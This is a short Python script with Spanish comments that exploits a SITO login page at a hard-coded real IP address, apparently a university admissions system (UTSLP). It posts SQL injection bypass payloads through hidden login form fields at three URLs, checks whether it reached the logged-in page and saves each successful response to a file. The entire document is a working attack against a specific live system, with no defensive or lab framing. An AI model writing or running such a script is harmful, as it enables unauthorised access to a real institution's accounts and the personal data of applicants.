# guardar como exploit_sito.py
import requests

def explotar_sito_especifico():
    """Explotación específica para la aplicación SITO encontrada"""
    target = "189.254.143.102"
    session = requests.Session()
    session.verify = False
    
    print("[*] Explotación específica SITO - UTSLP")
    
    # Los parámetros OCULTOS que encontraste
    parametros_ocultos = {
        'yAccion': 'login',
        'yIntentos': '1', 
        'yUsuario': '',
        'xUsuario': 'admin',
        'xContrasena': 'test'
    }
    
    # URL de login específica
    login_urls = [
        f"https://{target}/jsp/index.jsp",
        f"https://{target}/jsp/login.jsp", 
        f"http://{target}/jsp/index.jsp"
    ]
    
    for url in login_urls:
        try:
            # Probar SQL Injection con tus payloads exitosos
            payloads = ["admin' OR '1'='1'--", "' OR 1=1--", "admin' UNION SELECT 1,2,3--"]
            
            for payload in payloads:
                parametros_ocultos['xUsuario'] = payload
                parametros_ocultos['yUsuario'] = payload
                
                response = session.post(url, data=parametros_ocultos)
                
                if "Solicita Ficha de Admisión" in response.text:
                    print(f"[!] SQL Injection exitoso en {url}")
                    print(f"    Payload: {payload}")
                    
                    # Guardar respuesta
                    with open(f"sqli_success_{payload[:10]}.html", "w", encoding='utf-8') as f:
                        f.write(response.text)
                        
        except Exception as e:
            print(f"Error en {url}: {e}")

if __name__ == "__main__":
    explotar_sito_especifico()